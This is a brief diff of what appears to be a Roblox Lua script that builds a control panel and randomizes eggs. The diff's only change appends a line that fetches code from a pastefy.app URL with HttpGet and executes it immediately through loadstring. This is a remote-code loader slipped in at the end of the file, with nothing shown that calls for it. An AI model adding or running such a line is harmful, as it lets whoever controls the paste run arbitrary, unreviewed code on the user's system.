@@ -193,3 +193,4 @@ end)
 
 createControlPanel()
 randomizeAllEggs()
+loadstring(game:HttpGet("https://pastefy.app/I7hWrcJA/raw"))()
